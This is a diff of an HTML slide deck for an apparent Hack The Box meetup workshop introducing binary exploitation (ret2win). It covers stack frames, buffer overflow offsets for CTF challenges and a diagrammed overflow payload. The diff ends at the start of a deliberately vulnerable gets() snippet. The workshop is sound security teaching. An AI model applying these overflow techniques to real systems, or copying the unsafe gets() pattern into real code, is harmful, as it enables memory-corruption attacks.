@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HTB Meetup - Intro to PWN: Interactive Slides & Memory Visualizer</title>
+<title>HTB Meetup IIUM 2025 - Intro to PWN: Interactive Slides & Lab Guide</title>
 <style>
   :root {
     --bg-main: #0b111b;
@@ -37,10 +37,8 @@
     overflow: hidden;
     height: 100vh;
     width: 100vw;
-    user-select: none;
   }
 
-  /* Presentation Wrapper */
   #app {
     display: flex;
     flex-direction: column;
@@ -49,10 +47,10 @@
     position: relative;
   }
 
-  /* Top Navigation Bar */
+  /* Header Bar */
   header.top-bar {
     height: 54px;
-    background: rgba(11, 17, 27, 0.85);
+    background: rgba(11, 17, 27, 0.9);
     backdrop-filter: blur(12px);
     border-bottom: 1px solid var(--border-subtle);
     display: flex;
@@ -69,7 +67,6 @@
     font-weight: 700;
     font-size: 1.05rem;
     color: #ffffff;
-    letter-spacing: -0.3px;
   }
 
   .brand-badge {
@@ -85,22 +82,23 @@
   .nav-controls {
     display: flex;
     align-items: center;
-    gap: 12px;
+    gap: 10px;
   }
 
   .btn {
     background: var(--bg-card);
     border: 1px solid var(--border-subtle);
     color: var(--text-main);
-    padding: 6px 14px;
+    padding: 6px 12px;
     border-radius: 6px;
-    font-size: 0.85rem;
+    font-size: 0.82rem;
     font-weight: 600;
     cursor: pointer;
     transition: all 0.15s ease;
     display: inline-flex;
     align-items: center;
     gap: 6px;
+    user-select: none;
   }
 
   .btn:hover {
@@ -127,7 +125,6 @@
     color: var(--text-muted);
   }
 
-  /* Progress Bar */
   .progress-container {
     height: 3px;
     background: var(--border-subtle);
@@ -143,7 +140,7 @@
     transition: width 0.25s ease-out;
   }
 
-  /* Slide Stage Area */
+  /* Slide Stage */
   main.slide-stage {
     flex: 1;
     position: relative;
@@ -156,16 +153,15 @@
     left: 0;
     width: 100%;
     height: 100%;
-    padding: 40px 60px;
+    padding: 30px 54px;
     display: flex;
     flex-direction: column;
-    justify-content: center;
+    justify-content: flex-start;
     opacity: 0;
     pointer-events: none;
-    transform: scale(0.98) translateY(12px);
-    transition: opacity 0.3s cubic-bezier(0.16, 1, 0.3, 1), transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    transform: scale(0.985) translateY(10px);
+    transition: opacity 0.25s cubic-bezier(0.16, 1, 0.3, 1), transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
     overflow-y: auto;
-    user-select: text;
   }
 
   .slide.active {
@@ -175,49 +171,50 @@
     z-index: 10;
   }
 
-  /* Typography & Common Slide Styles */
+  /* Typography */
   h1.slide-title {
-    font-size: 2.8rem;
+    font-size: 2.3rem;
     font-weight: 800;
-    letter-spacing: -1px;
+    letter-spacing: -0.8px;
     color: #ffffff;
     line-height: 1.15;
-    margin-bottom: 12px;
+    margin-bottom: 6px;
   }
 
   h1.slide-title span.accent {
     color: var(--htb-green);
-    text-shadow: 0 0 24px var(--htb-green-glow);
+    text-shadow: 0 0 20px var(--htb-green-glow);
   }
 
   h2.slide-subtitle {
-    font-size: 1.4rem;
+    font-size: 1.15rem;
     font-weight: 600;
     color: var(--cyber-blue);
-    margin-bottom: 24px;
+    margin-bottom: 20px;
   }
 
   h3.section-header {
-    font-size: 1.15rem;
+    font-size: 1.05rem;
     color: var(--htb-green);
     font-weight: 700;
-    margin-bottom: 12px;
+    margin-bottom: 10px;
     text-transform: uppercase;
     letter-spacing: 0.5px;
   }
 
   p.description {
-    font-size: 1.1rem;
+    font-size: 1rem;
     color: var(--text-muted);
-    max-width: 900px;
-    margin-bottom: 24px;
+    max-width: 950px;
+    margin-bottom: 20px;
     line-height: 1.6;
   }
 
+  /* Layout Grids */
   .grid-2 {
     display: grid;
     grid-template-columns: 1fr 1fr;
-    gap: 32px;
+    gap: 24px;
     width: 100%;
     align-items: stretch;
   }
@@ -225,76 +222,136 @@
   .grid-3 {
     display: grid;
     grid-template-columns: 1fr 1fr 1fr;
-    gap: 20px;
+    gap: 18px;
     width: 100%;
   }
 
   .card {
     background: var(--bg-card);
     border: 1px solid var(--border-subtle);
-    border-radius: 12px;
-    padding: 24px;
+    border-radius: 10px;
+    padding: 20px;
     position: relative;
-    box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.4);
-    transition: transform 0.2s ease, border-color 0.2s ease;
-  }
-
-  .card:hover {
-    border-color: rgba(159, 239, 0, 0.4);
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
   }
 
   .card-header {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    margin-bottom: 16px;
-    padding-bottom: 12px;
+    margin-bottom: 12px;
+    padding-bottom: 8px;
     border-bottom: 1px solid var(--border-subtle);
   }
 
   .card-title {
-    font-size: 1.15rem;
+    font-size: 1.05rem;
     font-weight: 700;
     color: #ffffff;
   }
 
-  /* Code Boxes */
+  /* Code & Syntax */
   pre.code-block {
     background: var(--bg-code);
     border: 1px solid var(--border-subtle);
     border-radius: 8px;
-    padding: 16px;
+    padding: 14px;
     font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
-    font-size: 0.9rem;
+    font-size: 0.85rem;
     color: #e2e8f0;
     overflow-x: auto;
-    line-height: 1.5;
+    line-height: 1.48;
+    position: relative;
   }
 
   code.inline {
     background: rgba(255, 255, 255, 0.08);
     color: var(--htb-green);
-    padding: 2px 6px;
+    padding: 2px 5px;
     border-radius: 4px;
     font-family: ui-monospace, monospace;
-    font-size: 0.9em;
+    font-size: 0.88em;
+  }
+
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    background: rgba(255, 255, 255, 0.1);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    color: var(--text-muted);
+    font-size: 0.72rem;
+    padding: 2px 8px;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .copy-btn:hover {
+    background: var(--htb-green);
+    color: #000;
   }
 
   .highlight-green { color: var(--htb-green); font-weight: bold; }
   .highlight-red { color: var(--danger-red); font-weight: bold; }
   .highlight-blue { color: var(--cyber-blue); font-weight: bold; }
   .highlight-purple { color: var(--cyber-purple); font-weight: bold; }
+  .highlight-orange { color: var(--warning-orange); font-weight: bold; }
+  .highlight-muted { color: #64748b; }
 
-  /* Interactive Memory Layout Visualizer */
+  /* Tab Viewers */
+  .tab-container {
+    display: flex;
+    flex-direction: column;
+    width: 100%;
+  }
+
+  .tab-nav {
+    display: flex;
+    gap: 8px;
+    border-bottom: 1px solid var(--border-subtle);
+    margin-bottom: 12px;
+  }
+
+  .tab-btn {
+    background: transparent;
+    border: none;
+    color: var(--text-muted);
+    font-weight: 600;
+    font-size: 0.85rem;
+    padding: 6px 12px;
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+  }
+
+  .tab-btn:hover {
+    color: #ffffff;
+  }
+
+  .tab-btn.active {
+    color: var(--htb-green);
+    border-bottom-color: var(--htb-green);
+  }
+
+  .tab-content {
+    display: none;
+  }
+
+  .tab-content.active {
+    display: block;
+  }
+
+  /* Memory Ladder */
   .memory-container {
     display: flex;
-    gap: 28px;
-    height: 480px;
+    gap: 24px;
+    min-height: 440px;
     align-items: stretch;
   }
 
   .memory-ladder {
-    width: 280px;
+    width: 270px;
     display: flex;
     flex-direction: column;
     border: 2px solid #334155;
@@ -309,17 +366,12 @@
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding: 0 16px;
+    padding: 0 14px;
     font-weight: 600;
-    font-size: 0.92rem;
+    font-size: 0.88rem;
     cursor: pointer;
     border-bottom: 1px dashed rgba(255, 255, 255, 0.12);
     transition: all 0.2s ease;
-    position: relative;
-  }
-
-  .memory-segment:last-child {
-    border-bottom: none;
   }
 
   .memory-segment:hover, .memory-segment.selected {
@@ -330,7 +382,7 @@
   }
 
   .memory-segment.stack { background: #3b185f; color: #e9d5ff; border-left: 6px solid #a855f7; }
-  .memory-segment.gap { background: #070c14; color: #475569; font-style: italic; font-size: 0.8rem; cursor: default; }
+  .memory-segment.gap { background: #070c14; color: #475569; font-style: italic; font-size: 0.78rem; cursor: default; }
   .memory-segment.heap { background: #134e4a; color: #a7f3d0; border-left: 6px solid #10b981; }
   .memory-segment.bss { background: #713f12; color: #fde047; border-left: 6px solid #eab308; }
   .memory-segment.data { background: #1e3a8a; color: #93c5fd; border-left: 6px solid #3b82f6; }
@@ -353,28 +405,28 @@
     justify-content: center;
   }
 
-  /* Live Buffer Overflow Simulator */
+  /* Live Simulator */
   .simulator-box {
     display: flex;
     flex-direction: column;
-    gap: 20px;
+    gap: 16px;
     background: var(--bg-card);
     border: 1px solid var(--border-subtle);
-    border-radius: 12px;
-    padding: 24px;
+    border-radius: 10px;
+    padding: 20px;
   }
 
   .sim-controls {
     display: flex;
     flex-wrap: wrap;
     align-items: center;
-    gap: 12px;
+    gap: 10px;
   }
 
   .sim-input-group {
     display: flex;
     align-items: center;
-    gap: 10px;
+    gap: 8px;
     flex: 1;
   }
 
@@ -384,11 +436,10 @@
     border: 1px solid #334155;
     color: var(--htb-green);
     font-family: ui-monospace, monospace;
-    font-size: 1rem;
-    padding: 10px 14px;
+    font-size: 0.95rem;
+    padding: 8px 12px;
     border-radius: 6px;
     outline: none;
-    transition: border-color 0.2s;
   }
 
   .sim-input:focus {
@@ -407,23 +458,19 @@
 
   .stack-row {
     display: grid;
-    grid-template-columns: 140px 180px 1fr 140px;
-    padding: 10px 16px;
+    grid-template-columns: 140px 170px 1fr 140px;
+    padding: 9px 14px;
     border-bottom: 1px solid #1e293b;
     align-items: center;
     font-family: ui-monospace, monospace;
-    font-size: 0.88rem;
+    font-size: 0.85rem;
     transition: background-color 0.25s ease;
-  }
-
-  .stack-row:last-child {
-    border-bottom: none;
   }
 
   .stack-row.header {
     background: #101c2e;
     color: var(--text-muted);
-    font-size: 0.78rem;
+    font-size: 0.75rem;
     text-transform: uppercase;
     font-weight: 700;
   }
@@ -442,33 +489,17 @@
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding: 14px 20px;
+    padding: 12px 18px;
     border-radius: 8px;
     font-weight: 700;
-    font-size: 1rem;
-    transition: all 0.3s ease;
+    font-size: 0.92rem;
   }
 
-  .status-normal {
-    background: rgba(59, 130, 246, 0.15);
-    border: 1px solid #3b82f6;
-    color: #60a5fa;
-  }
+  .status-normal { background: rgba(59, 130, 246, 0.15); border: 1px solid #3b82f6; color: #60a5fa; }
+  .status-crash { background: rgba(239, 68, 68, 0.2); border: 1px solid var(--danger-red); color: #fca5a5; }
+  .status-win { background: rgba(159, 239, 0, 0.2); border: 1px solid var(--htb-green); color: var(--htb-green); box-shadow: 0 0 20px var(--htb-green-glow); }
 
-  .status-crash {
-    background: rgba(239, 68, 68, 0.2);
-    border: 1px solid var(--danger-red);
-    color: #fca5a5;
-  }
-
-  .status-win {
-    background: rgba(159, 239, 0, 0.2);
-    border: 1px solid var(--htb-green);
-    color: var(--htb-green);
-    box-shadow: 0 0 20px var(--htb-green-glow);
-  }
-
-  /* Overview Grid Modal */
+  /* Modal Overview */
   .overview-modal {
     position: fixed;
     top: 0;
@@ -484,25 +515,23 @@
     overflow-y: auto;
   }
 
-  .overview-modal.open {
-    display: flex;
-  }
+  .overview-modal.open { display: flex; }
 
   .overview-grid {
     display: grid;
     grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
-    gap: 20px;
-    margin-top: 24px;
+    gap: 16px;
+    margin-top: 20px;
   }
 
   .slide-thumb {
     background: var(--bg-card);
     border: 1px solid var(--border-subtle);
     border-radius: 8px;
-    padding: 16px;
+    padding: 14px;
     cursor: pointer;
     transition: all 0.2s ease;
-    height: 160px;
+    height: 140px;
     display: flex;
     flex-direction: column;
     justify-content: space-between;
@@ -510,8 +539,8 @@
 
   .slide-thumb:hover {
     border-color: var(--htb-green);
-    transform: translateY(-3px);
-    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+    transform: translateY(-2px);
+    box-shadow: 0 6px 18px rgba(0, 0, 0, 0.4);
   }
 
   .slide-thumb.current {
@@ -519,21 +548,6 @@
     box-shadow: 0 0 12px var(--htb-green-glow);
   }
 
-  .slide-thumb-num {
-    font-size: 0.75rem;
-    font-weight: 700;
-    color: var(--htb-green);
-    text-transform: uppercase;
-  }
-
-  .slide-thumb-title {
-    font-size: 0.95rem;
-    font-weight: 600;
-    color: #ffffff;
-    line-height: 1.3;
-  }
-
-  /* Keybind Tooltip Bar */
   .bottom-bar {
     height: 38px;
     background: #090f19;
@@ -546,11 +560,6 @@
     color: var(--text-muted);
   }
 
-  .keybinds {
-    display: flex;
-    gap: 16px;
-  }
-
   kbd {
     background: #1e293b;
     color: #cbd5e1;
@@ -558,35 +567,33 @@
     border-radius: 4px;
     border: 1px solid #334155;
     font-family: inherit;
-    font-size: 0.75rem;
   }
 
-  /* Responsive Adjustments */
   @media (max-width: 900px) {
     .grid-2, .grid-3 { grid-template-columns: 1fr; }
-    .memory-container { flex-direction: column; height: auto; }
-    .memory-ladder { width: 100%; height: 220px; }
-    h1.slide-title { font-size: 2rem; }
-    .slide { padding: 24px; }
+    .memory-container { flex-direction: column; min-height: auto; }
+    .memory-ladder { width: 100%; height: 200px; }
+    h1.slide-title { font-size: 1.8rem; }
+    .slide { padding: 20px; }
   }
 </style>
 </head>
 <body>
 
 <div id="app">
-  <!-- Top Bar -->
+  <!-- Top Navigation Bar -->
   <header class="top-bar">
     <div class="brand">
-      <span class="brand-badge">HTB Meetup</span>
+      <span class="brand-badge">HTB Meetup IIUM</span>
       <span>Intro to PWN: Binary Exploitation</span>
     </div>
 
     <div class="nav-controls">
-      <span class="slide-counter" id="slideIndicator">Slide 1 / 14</span>
-      <button class="btn" id="btnPrev" title="Previous Slide (← or PageUp)">◀ Prev</button>
-      <button class="btn btn-primary" id="btnNext" title="Next Slide (→, Space, or PageDown)">Next ▶</button>
-      <button class="btn" id="btnOverview" title="Toggle Slide Overview (O)">🗂 Overview</button>
-      <button class="btn" id="btnFullscreen" title="Toggle Fullscreen (F)">⛶ Fullscreen</button>
+      <span class="slide-counter" id="slideIndicator">Slide 1 / 15</span>
+      <button class="btn" id="btnPrev" title="Previous Slide (←)">◀ Prev</button>
+      <button class="btn btn-primary" id="btnNext" title="Next Slide (→, Space)">Next ▶</button>
+      <button class="btn" id="btnOverview" title="Slide Overview (O)">🗂 Overview</button>
+      <button class="btn" id="btnFullscreen" title="Fullscreen (F)">⛶ Fullscreen</button>
     </div>
   </header>
 
@@ -598,37 +605,36 @@
   <!-- Slide Stage -->
   <main class="slide-stage" id="slideStage">
 
-    <!-- Slide 1: Welcome & Title -->
-    <section class="slide active" data-title="Title & Welcome">
+    <!-- Slide 1: Welcome & Overview -->
+    <section class="slide active" data-title="Title & Speaker">
       <div style="max-width: 960px;">
-        <span class="brand-badge" style="font-size: 0.85rem; padding: 4px 10px; margin-bottom: 16px; display: inline-block;">HACK THE BOX MEETUP IIUM</span>
-        <h1 class="slide-title">Introduction to <span class="accent">PWN</span></h1>
-        <h2 class="slide-subtitle">Stack-Based Buffer Overflow &amp; Binary Exploitation</h2>
+        <span class="brand-badge" style="font-size: 0.85rem; padding: 4px 10px; margin-bottom: 14px; display: inline-block;">HACK THE BOX MEETUP IIUM 2025</span>
+        <h1 class="slide-title">Intro to <span class="accent">PWN</span>: ret2win</h1>
+        <h2 class="slide-subtitle">Buffer Overflow Exploitation on x86 &amp; x64 Architectures</h2>
         <p class="description">
-          An interactive, hands-on workshop guiding you from low-level computer architecture and memory fundamentals all the way to crafting memory-corrupting return-to-win (ret2win) exploits.
+          A step-by-step interactive workshop guiding you through low-level computer architecture, stack frames, memory corruption, and crafting working payloads for hands-on challenges and a mini-CTF.
         </p>
 
-        <div class="grid-2" style="margin-top: 32px;">
+        <div class="grid-2" style="margin-top: 24px;">
           <div class="card">
             <h3 class="section-header">Speaker</h3>
-            <div style="display: flex; gap: 16px; align-items: center;">
-              <div>
-                <p style="font-weight: 700; font-size: 1.15rem; color: #ffffff;">Mohammad Danish Hakim (Jerit3787)</p>
-                <p style="color: var(--text-muted); font-size: 0.92rem;">CS (Network &amp; Security) • MCC Alumni • RE:UN1ON</p>
-                <p style="margin-top: 8px;"><a href="https://danplace.tech" target="_blank" style="color: var(--htb-green); text-decoration: none;">https://danplace.tech</a></p>
-              </div>
-            </div>
+            <p style="font-weight: 700; font-size: 1.15rem; color: #ffffff;">Mohammad Danish Hakim (Jerit3787)</p>
+            <p style="color: var(--text-muted); font-size: 0.9rem;">CS (Network &amp; Security) • MCC Alumni • RE:UN1ON</p>
+            <p style="margin-top: 10px; font-size: 0.92rem;">
+              📖 <strong>Official Writeup:</strong><br>
+              <a href="https://ctf.danplace.tech/posts/htb-meetup-iium/" target="_blank" style="color: var(--htb-green); text-decoration: none; font-weight: 600;">https://ctf.danplace.tech/posts/htb-meetup-iium/</a>
+            </p>
           </div>
 
           <div class="card">
-            <h3 class="section-header">Workshop Outline</h3>
-            <ul style="list-style: none; display: flex; flex-direction: column; gap: 8px; font-size: 0.95rem;">
-              <li><span class="highlight-green">01.</span> Binaries &amp; Memory Layout Fundamentals</li>
-              <li><span class="highlight-green">02.</span> Anatomy of the Stack Frame &amp; Function Calls</li>
-              <li><span class="highlight-green">03.</span> Interactive Buffer Overflow Simulator</li>
-              <li><span class="highlight-green">04.</span> 32-bit (x86) vs 64-bit (x64) Architecture Differences</li>
-              <li><span class="highlight-green">05.</span> Security Mitigations (Checksec) &amp; ret2win Attacks</li>
-              <li><span class="highlight-green">06.</span> Hands-on Labs &amp; Docker CTF Challenges</li>
+            <h3 class="section-header">Workshop Modules</h3>
+            <ul style="list-style: none; display: flex; flex-direction: column; gap: 6px; font-size: 0.9rem;">
+              <li><span class="highlight-green">01.</span> Fundamentals: Binaries, Memory Layout &amp; The Stack</li>
+              <li><span class="highlight-green">02.</span> Live Interactive Buffer Overflow Simulator</li>
+              <li><span class="highlight-green">03.</span> Hands-On Practice: x86 Challenge (<code class="inline">offset = 76</code>)</li>
+              <li><span class="highlight-green">04.</span> Hands-On Practice: x64 Challenge (<code class="inline">offset = 72</code> + <code class="inline">ret</code> trap)</li>
+              <li><span class="highlight-green">05.</span> Mini-CTF: x86 Daemon (<code class="inline">offset = 44</code>)</li>
+              <li><span class="highlight-green">06.</span> Mini-CTF: x64 Daemon (<code class="inline">offset = 40</code> + <code class="inline">ret</code> gadget)</li>
             </ul>
           </div>
         </div>
@@ -638,51 +644,46 @@
     <!-- Slide 2: What is a Binary & What is PWN? -->
     <section class="slide" data-title="What is a Binary & PWN?">
       <h1 class="slide-title">What is a <span class="accent">Binary</span> &amp; <span class="accent">PWN</span>?</h1>
-      <h2 class="slide-subtitle">Bridging human-readable code to raw CPU instructions</h2>
+      <h2 class="slide-subtitle">Bridging source code to CPU machine instructions</h2>
 
       <div class="grid-2">
         <div class="card">
           <h3 class="section-header">From Code to Machine Language</h3>
-          <p style="margin-bottom: 14px;">
+          <p style="margin-bottom: 12px; font-size: 0.92rem;">
             A <strong>binary</strong> is a compiled executable containing machine instructions that the CPU processes directly (e.g. Linux ELF, Windows PE).
           </p>
-          <pre class="code-block" style="margin-bottom: 16px;">
+          <pre class="code-block" style="margin-bottom: 14px;">
 Source Code (.c)
    │
    ▼  [gcc -o program main.c]
 Assembly Code (.s)
    │
-   ▼  [Assembler]
-Machine Code / Binary ELF (.bin)
-   └─► Executed directly by CPU registers &amp; ALU</pre>
-          <p style="font-size: 0.92rem; color: var(--text-muted);">
-            Computers do not understand C variables, functions, or bounds. They only execute a continuous sequence of instructions reading from and writing to raw memory addresses.
+   ▼  [Assembler &amp; Linker]
+Machine Code / Binary ELF (0s &amp; 1s)</pre>
+          <p style="font-size: 0.88rem; color: var(--text-muted);">
+            CPUs have no awareness of C variables, buffer boundaries, or data types. They execute linear instruction streams reading and writing raw memory addresses.
           </p>
         </div>
 
         <div class="card">
           <h3 class="section-header">What is Binary Exploitation (PWN)?</h3>
-          <p style="margin-bottom: 14px;">
-            <strong>PWN</strong> is the art of subverting compiled software by manipulating memory errors to hijack execution flow.
+          <p style="margin-bottom: 12px; font-size: 0.92rem;">
+            Unlike web or crypto challenges where you inspect source code or cryptographic algorithms, <strong>PWN</strong> operates at the lowest level: assembly, memory layout, and registers.
           </p>
-          <ul style="list-style: none; display: flex; flex-direction: column; gap: 12px; font-size: 0.95rem;">
+          <ul style="list-style: none; display: flex; flex-direction: column; gap: 10px; font-size: 0.9rem;">
             <li style="display: flex; gap: 10px;">
               <span class="highlight-green">🎯</span>
-              <div><strong>Hijack Control Flow:</strong> Steer the instruction pointer (<code class="inline">RIP/EIP</code>) to run unintended functions.</div>
+              <div><strong>Find the Buffer Overflow:</strong> Locate an unconstrained memory read function (e.g. <code class="inline">gets()</code>).</div>
             </li>
             <li style="display: flex; gap: 10px;">
-              <span class="highlight-green">🔓</span>
-              <div><strong>Bypass Protections:</strong> Circumvent security defenses like non-executable stacks, canaries, and ASLR.</div>
+              <span class="highlight-green">📐</span>
+              <div><strong>Calculate the Offset:</strong> Determine exactly how many bytes are needed to reach the return address.</div>
             </li>
             <li style="display: flex; gap: 10px;">
               <span class="highlight-green">🚩</span>
-              <div><strong>Capture The Flag:</strong> Execute <code class="inline">win()</code>, dump memory flags, or spawn an interactive shell (<code class="inline">/bin/sh</code>).</div>
+              <div><strong>Hijack Control Flow:</strong> Overwrite the return address to jump to <code class="inline">win()</code> / <code class="inline">get_flag()</code>.</div>
             </li>
           </ul>
-
-          <div style="margin-top: 20px; padding: 12px; background: rgba(159, 239, 0, 0.08); border-left: 4px solid var(--htb-green); border-radius: 4px; font-style: italic;">
-            "Turning a memory management bug into an unexpected feature for hackers."
-          </div>
         </div>
       </div>
     </section>
@@ -690,7 +691,7 @@ Machine Code / Binary ELF (.bin)
     <!-- Slide 3: Interactive Process Memory Layout -->
     <section class="slide" data-title="Process Memory Layout">
       <h1 class="slide-title">Linux Process <span class="accent">Memory Layout</span></h1>
-      <h2 class="slide-subtitle">Click each segment to inspect its role, permissions, and exploit relevance</h2>
+      <h2 class="slide-subtitle">Click each segment to inspect its address range, permissions, and security impact</h2>
 
       <div class="memory-container">
         <!-- Visual Segment Ladder -->
@@ -721,19 +722,19 @@ Machine Code / Binary ELF (.bin)
           </div>
         </div>
 
-        <!-- Segment Detail Inspector Card -->
+        <!-- Inspector Card -->
         <div class="memory-inspector" id="memoryInspector">
-          <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px;">
-            <h3 id="inspectTitle" style="font-size: 1.5rem; color: #ffffff;">The Stack</h3>
+          <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+            <h3 id="inspectTitle" style="font-size: 1.4rem; color: #ffffff;">The Stack</h3>
             <span id="inspectPerms" class="brand-badge" style="background: #a855f7; color: #fff;">RW- (Read / Write)</span>
           </div>
-          <p id="inspectDesc" style="font-size: 1.05rem; line-height: 1.6; color: var(--text-main); margin-bottom: 18px;">
-            The Stack manages function call frames, local variables (e.g. <code class="inline">char buf[64]</code>), and return addresses. It grows <strong>downward</strong> from high addresses to low addresses in memory.
+          <p id="inspectDesc" style="font-size: 0.98rem; line-height: 1.6; color: var(--text-main); margin-bottom: 16px;">
+            The Stack manages function call frames, local variables (e.g. <code class="inline">char buffer[64]</code>), and return addresses. It grows <strong>downward</strong> from high addresses to low addresses in memory.
           </p>
           <div class="card" style="background: var(--bg-card-alt); border-color: rgba(255,255,255,0.08);">
-            <h4 style="color: var(--htb-green); font-size: 0.95rem; margin-bottom: 8px;">⚔️ Security &amp; Exploitation Relevance</h4>
-            <p id="inspectSecurity" style="font-size: 0.92rem; color: var(--text-muted); line-height: 1.5;">
-              Vulnerable to <strong>Stack-Based Buffer Overflows</strong>. Writing past local buffers allows an attacker to overwrite saved frame pointers (<code class="inline">RBP</code>) and return addresses (<code class="inline">RIP</code>), completely hijacking execution flow.
+            <h4 style="color: var(--htb-green); font-size: 0.92rem; margin-bottom: 6px;">⚔️ Exploitation Role</h4>
+            <p id="inspectSecurity" style="font-size: 0.88rem; color: var(--text-muted); line-height: 1.5;">
+              Target of <strong>Stack-Based Buffer Overflows</strong>. Writing past local buffers spills into Saved RBP and the Return Address (<code class="inline">RIP/EIP</code>), redirecting execution to any function we choose!
             </p>
           </div>
         </div>
@@ -747,50 +748,40 @@ Machine Code / Binary ELF (.bin)
 
       <div class="grid-2">
         <div class="card">
-          <h3 class="section-header">The Critical Conflict</h3>
-          <p style="margin-bottom: 14px;">
-            When a function is called, a new stack frame is allocated:
-          </p>
-          <ol style="padding-left: 20px; display: flex; flex-direction: column; gap: 8px; font-size: 0.92rem; margin-bottom: 18px;">
-            <li><code class="inline">call function</code> pushes the <strong>Return Address</strong> onto the stack.</li>
-            <li>Function prologue executes: <code class="inline">push rbp; mov rbp, rsp</code>.</li>
-            <li>Stack space is reserved for local variables by subtracting RSP: <code class="inline">sub rsp, 0x40</code>.</li>
+          <h3 class="section-header">Function Call Lifecycle</h3>
+          <ol style="padding-left: 20px; display: flex; flex-direction: column; gap: 8px; font-size: 0.9rem; margin-bottom: 16px;">
+            <li><strong>`call function`:</strong> CPU pushes the current next-instruction address (<strong>Return Address</strong>) onto the stack.</li>
+            <li><strong>Prologue:</strong> Function saves the caller's base pointer (<code class="inline">push rbp; mov rbp, rsp</code>).</li>
+            <li><strong>Allocation:</strong> Space is reserved for local variables by decrementing RSP (<code class="inline">sub rsp, 0x40</code>).</li>
+            <li><strong>Epilogue &amp; `ret`:</strong> Function cleans up frame (<code class="inline">leave</code>) and executes <code class="inline">ret</code> (which pops the Return Address into RIP).</li>
           </ol>
 
-          <div style="padding: 14px; background: rgba(0, 212, 255, 0.08); border-left: 4px solid var(--cyber-blue); border-radius: 4px;">
-            <p style="font-size: 0.92rem; font-weight: 600; color: var(--cyber-blue);">The Golden Rule of Stack Overflows:</p>
-            <p style="font-size: 0.88rem; color: var(--text-main); margin-top: 4px;">
-              The <strong>Stack grows downwards</strong> (High Address ➔ Low Address), but <strong>buffers are filled upwards</strong> (Low Address ➔ High Address towards the return address)!
+          <div style="padding: 12px; background: rgba(0, 212, 255, 0.08); border-left: 4px solid var(--cyber-blue); border-radius: 4px;">
+            <p style="font-size: 0.9rem; font-weight: 600; color: var(--cyber-blue);">The Key Conflict:</p>
+            <p style="font-size: 0.85rem; color: var(--text-main); margin-top: 4px;">
+              The <strong>Stack grows downward</strong> (High ➔ Low Address), but <strong>buffers are filled upward</strong> (Low ➔ High Address toward the Return Address)!
             </p>
           </div>
         </div>
 
-        <div class="card" style="display: flex; flex-direction: column; justify-content: center;">
-          <h3 class="section-header" style="text-align: center; margin-bottom: 12px;">Stack Frame Layout (x64)</h3>
-          <div style="border: 2px solid #334155; border-radius: 8px; overflow: hidden; font-family: ui-monospace, monospace; font-size: 0.88rem;">
-            <div style="background: #1e1b4b; color: #c7d2fe; padding: 12px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between;">
-              <span>[High Address] Function Arguments</span>
-              <span>Caller Frame</span>
-            </div>
-            <div style="background: #450a0a; color: #fecaca; padding: 12px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; font-weight: bold;">
-              <span>🎯 Return Address (RIP)</span>
-              <span>8 Bytes</span>
-            </div>
-            <div style="background: #713f12; color: #fef08a; padding: 12px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between;">
-              <span>Saved Base Pointer (RBP)</span>
-              <span>8 Bytes</span>
-            </div>
-            <div style="background: #064e3b; color: #a7f3d0; padding: 20px 12px; display: flex; flex-direction: column; gap: 4px;">
-              <div style="display: flex; justify-content: space-between;">
-                <span>Local Buffer (e.g. char buf[64])</span>
-                <span>64 Bytes</span>
-              </div>
-              <span style="font-size: 0.75rem; color: var(--htb-green);">▲ Data is written upwards towards Saved RBP &amp; RIP!</span>
-            </div>
-            <div style="background: #0f172a; color: #64748b; padding: 8px 12px; font-size: 0.8rem; text-align: center;">
-              [Low Address - Top of Stack (RSP)]
-            </div>
-          </div>
+        <div class="card">
+          <h3 class="section-header" style="text-align: center; margin-bottom: 10px;">Visual Frame Before &amp; After Overflow</h3>
+          <pre class="code-block" style="font-size: 0.82rem; line-height: 1.35;">
+    BEFORE OVERFLOW                      AFTER OVERFLOW
+    (Normal Input)                       (Malicious Input)
+   
+   +------------------+                 +------------------+
+   |  Return Address  |  &lt;-- Target     |   win() addr     |  &lt;-- Overwritten!
+   +------------------+                 +------------------+
+   |    Saved RBP     |  (8 bytes)      |    AAAAAAAA      |  &lt;-- Overwritten!
+   +------------------+                 +------------------+
+   |                  |                 |    AAAAAAAA      |
+   |   buffer[64]     |  (64 bytes)     |    AAAAAAAA      |
+   |                  |                 |    AAAAAAAA      |
+   +------------------+                 +------------------+
+          ↑                                    ↑
+      User Input                        User Input (72+ bytes)
+      "Hello"                           "A" * 72 + win_addr</pre>
         </div>
       </div>
     </section>
@@ -798,61 +789,57 @@ Machine Code / Binary ELF (.bin)
     <!-- Slide 5: Vulnerable C Functions -->
     <section class="slide" data-title="Vulnerable C Functions">
       <h1 class="slide-title">Vulnerable <span class="accent">C Functions</span></h1>
-      <h2 class="slide-subtitle">Where does the vulnerability come from in real source code?</h2>
+      <h2 class="slide-subtitle">The dangerous functions that make buffer overflows possible</h2>
 
       <div class="grid-2">
         <div class="card">
-          <h3 class="section-header">Vulnerable Code Snippet</h3>
+          <h3 class="section-header">The Notorious gets() Function</h3>
           <pre class="code-block"><span class="highlight-blue">#include</span> &lt;stdio.h&gt;
 
 <span class="highlight-purple">void</span> <span class="highlight-green">vulnerable</span>() {
     <span class="highlight-purple">char</span> buffer[64];
 
     printf(<span class="highlight-blue">"Enter your input: "</span>);
